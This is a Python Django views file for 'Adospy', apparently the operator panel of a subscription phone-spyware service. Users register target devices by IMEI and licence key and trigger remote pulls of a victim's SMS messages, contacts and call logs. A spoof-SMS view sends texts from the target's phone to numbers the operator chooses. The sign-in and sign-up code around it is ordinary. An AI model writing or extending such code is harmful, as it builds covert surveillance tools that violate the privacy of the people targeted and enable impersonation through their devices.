# mixins.py
import datetime
import json
import uuid
from inertia import render

from authentication.tasks import fetch_call_logs_socket, fetch_contacts_socket, fetch_sms, send_email, send_websocket_sms
from .mixins import InertiaView
from .forms import SignInForms, SignUpForms, SpoofSMSForm, SubscribeForm, TargetAliasNameForm
from django.shortcuts import redirect
from .models import CallLogs, Contacts, SMSMessages, User, Target
from django.utils.http import urlsafe_base64_encode, urlsafe_base64_decode
from django.utils.encoding import force_bytes
from django.contrib.auth.tokens import default_token_generator
from django.urls import reverse
from django.contrib.auth import authenticate, login
from django.contrib.auth.mixins import LoginRequiredMixin
from collections import defaultdict


class SigninView(InertiaView):
    template_name = "SignIn"

    def get_props(self):
        return {}

    def post(self, request, *args, **kwargs):
        form = SignInForms(json.loads(request.body))
        if form.is_valid():
            username = form.cleaned_data['username']
            password = form.cleaned_data['password']
            remember_me = form.cleaned_data['remember_me']

            user = authenticate(request, username=username, password=password)

            if user is None:
                return render(request, self.template_name, props={
                    "errors": {
                        "username": "Invalid credentials"
                    }
                })

            if user.verified is False:
                return render(request, self.template_name, props={
                    "errors": {
                        "username": "Email not verified"
                    }
                })

            if user.check_password(password) is False:
                return render(request, self.template_name, props={
                    "errors": {
                        "username": "Invalid credentials"
                    }
                })

            if user.is_active is False:
                return render(request, self.template_name, props={
                    "errors": {
                        "username": "Account disabled"
                    }
                })

            login(request, user)
            # Set session expiry time based on remember_me
            if remember_me == True:
                request.session.set_expiry(1209600)  # 2 weeks
            else:
                request.session.set_expiry(0)

            return redirect("dashboard")
        return render(request, self.template_name, props={
            "errors": {
                "username": "Invalid credentials"
            }
        })


class SignUpView(InertiaView):
    template_name = "Signup"

    def get_props(self):
        return {}

    def post(self, request, *args, **kwargs):
        form = SignUpForms(json.loads(request.body))

        if form.is_valid():
            first_name = form.cleaned_data['first_name']
            last_name = form.cleaned_data['last_name']
            email = form.cleaned_data['email']
            password = form.cleaned_data['password']
            confirm_password = form.cleaned_data['confirm_password']

            if password != confirm_password:
                return render(request, self.template_name, props={
                    "errors": {
                        "password": "Passwords do not match"
                    }
                })

            if User.objects.filter(email=email).exists():
                return render(request, self.template_name, props={
                    "errors": {
                        "password": "Email already exists"
                    }
                })

            user = User.objects.create_user(
                first_name=first_name,
                last_name=last_name,
                email=email,
                username=email,
                password=password
            )

            # Generate token and UID
            uid = urlsafe_base64_encode(force_bytes(user.pk))
            token = default_token_generator.make_token(user)

            # Create verification link
            verification_url = request.build_absolute_uri(
                reverse("verify-email", kwargs={"uidb64": uid, "token": token})
            )

            # Send verification link
            title = "Account created successfully"
            message = f'''
            Hello {first_name} {last_name},

            Welcome to Adospy – your trusted platform for digital command and control.

            Please verify your email by clicking the link below:

            🔗 {verification_url}

            If you didn’t sign up for Adospy, you can safely ignore this email.

            Best regards,  
            The Adospy Team
                    '''

            send_email.delay(title, message, email)

            return render(request, self.template_name, props={
                "errors": {
                    "success": "Account created successfully"
                }
            })
        return render(request, self.template_name, props={
            "errors": {
                "first_name": "Invalid credentials"
            }
        })


class SignOutView(LoginRequiredMixin, InertiaView):
    login_url = "/signin"

    def get(self, request, *args, **kwargs):
        from django.contrib.auth import logout
        logout(request)
        return redirect("signin")


class VerifyEmailView(InertiaView):
    template_name = "VerifyEmail"

    def get(self, request, *args, **kwargs):
        uid = kwargs["uidb64"]
        token = kwargs["token"]

        try:
            uid = urlsafe_base64_decode(uid).decode()
            user = User.objects.get(pk=uid)
        except (TypeError, ValueError, OverflowError, User.DoesNotExist):
            user = None

        if user is not None and default_token_generator.check_token(user, token):
            user.verified = True
            user.verified_at = datetime.datetime.now()
            user.save()

            return render(request, self.template_name, props={
                "errors": {
                    "success": "Email verified successfully"
                }
            })
        return render(request, self.template_name, props={
            "errors": {
                "fail": "Invalid verification link"
            }
        })


class ProfileView(LoginRequiredMixin, InertiaView):
    template_name = "Profile"
    login_url = "/signin"

    def get_props(self):
        user = self.request.user

        return {
            "user": user,
        }


class TargetsView(LoginRequiredMixin, InertiaView):
    template_name = "Targets"
    login_url = "/signin"

    def get_props(self):
        user = self.request.user
        targets = Target.objects.filter(user=user).values()

        return {
            "targets": targets
        }

    def post(self, request, *args, **kwargs):
        user = self.request.user
        form = SubscribeForm(json.loads(request.body))

        if form.is_valid():
            plan_type = form.cleaned_data['plan_type']

            if plan_type not in ["monthly", "annual"]:
                return render(request, self.template_name, props={
                    "errors": {
                        "plan_type": "Invalid plan type"
                    }
                })
            if plan_type == "monthly":
                plan_end = datetime.datetime.now() + datetime.timedelta(days=30)
            else:
                plan_end = datetime.datetime.now() + datetime.timedelta(days=365)

            Target.objects.create(
                user=user,
                plan_type=plan_type,
                plan_end=plan_end,
                license_key=str(uuid.uuid4()).upper(),
            )

            return redirect("targets")

        return render(request, self.template_name, props={
            "errors": {
                "plan_type": "Invalid plan type"
            },
        })

    def put(self, request, *args, **kwargs):
        user = self.request.user
        form = TargetAliasNameForm(json.loads(request.body))

        if form.is_valid():
            try:
                target_id = form.cleaned_data['target_id']
                name_alias = form.cleaned_data['name_alias']

                target = Target.objects.get(id=target_id, user=user)
                target.name_alias = name_alias
                target.save()

                return render(request, self.template_name, props={
                    "errors": {
                        "success": "Target alias name updated successfully",
                    },
                    "targets": Target.objects.filter(user=user).values()
                })
            except Target.DoesNotExist:
                return render(request, self.template_name, props={
                    "errors": {
                        "name_alias": "Target not found",
                    },
                    "targets": Target.objects.filter(user=user).values()
                })

        return render(request, self.template_name, props={
            "errors": {
                "name_alias": "Failed to update target alias name",
            },
            "targets": Target.objects.filter(user=user).values()
        })

    def delete(self, request, *args, **kwargs):
        user = self.request.user
        target_id = kwargs["target_id"]

        try:
            target = Target.objects.get(id=target_id, user=user)
            target.delete()
            return redirect("targets")
        except Target.DoesNotExist:
            return redirect("targets")


class MessagesView(LoginRequiredMixin, InertiaView):
    template_name = "Messages"
    login_url = "/signin"

    def get_props(self):
        user = self.request.user
        try:
            target = Target.objects.get(status="active", user=user)
        except Target.DoesNotExist:
            return {
                "messages": {}
            }
        messages = SMSMessages.objects.filter(
            target=target).order_by("date").values()

        # Step 1: Group messages by address
        grouped = defaultdict(list)
        for msg in messages:
            grouped[msg['address']].append(msg)

        # Step 2: Sort messages inside each group (by date ascending)
        for address in grouped:
            grouped[address].sort(key=lambda x: x['date'])

        # Step 3: Sort the groups by the most recent message (descending)
        sorted_grouped = dict(
            sorted(grouped.items(),
                   key=lambda x: x[1][-1]['date'], reverse=True)
        )

        return {
            "messages": sorted_grouped
        }


class SyncTargetView(LoginRequiredMixin, InertiaView):
    login_url = "/signin"

    def get(self, request, *args, **kwargs):
        user = self.request.user
        sync_type = kwargs["sync_type"]

        try:
            target = Target.objects.get(status="active", user=user)
        except Target.DoesNotExist:
            return redirect("targets")

        if sync_type == "sms":
            fetch_sms.delay(target.id, target.device_imei, target.license_key)
            return redirect("messages")
        elif sync_type == "contacts":
            fetch_contacts_socket.delay(
                target.id, target.device_imei, target.license_key)
            return redirect("contacts")
        elif sync_type == "call_logs":
            fetch_call_logs_socket.delay(
                target.id, target.device_imei, target.license_key)
            return redirect("call-logs")

        return redirect("targets")


class SpoofSMSView(LoginRequiredMixin, InertiaView):
    template_name = "SpoofSms"
    login_url = "/signin"

    def get_props(self):
        return {}

    def post(self, request, *args, **kwargs):
        form = SpoofSMSForm(json.loads(request.body))

        if form.is_valid():
            user = self.request.user

            try:
                target = Target.objects.get(status="active", user=user)
            except Target.DoesNotExist:
                return render(request, self.template_name, props={
                    "errors": {
                        "phone": "Target not found",
                    },
                })

            send_websocket_sms.delay(
                target.id,
                target.device_imei,
                target.license_key,
                form.cleaned_data["phone"],
                form.cleaned_data["message"],
            )

            return render(request, self.template_name, props=self.get_props())
        return render(request, self.template_name, props=self.get_props())


class ContactsView(LoginRequiredMixin, InertiaView):
    template_name = "Contacts"
    login_url = "/signin"

    def get_props(self):
        user = self.request.user
        try:
            target = Target.objects.get(status="active", user=user)
        except Target.DoesNotExist:
            return {
                "contacts": []
            }
        contacts = Contacts.objects.filter(
            target=target).order_by("name").values()

        return {
            "contacts": contacts
        }


class CallLogsView(LoginRequiredMixin, InertiaView):
    template_name = "CallLogs"
    login_url = "/signin"

    def get_props(self):
        user = self.request.user
        try:
            target = Target.objects.get(status="active", user=user)
        except Target.DoesNotExist:
            return {
                "call_logs": []
            }
        call_logs = CallLogs.objects.filter(
            target=target).order_by("date").values()

        return {
            "call_logs": call_logs
        }
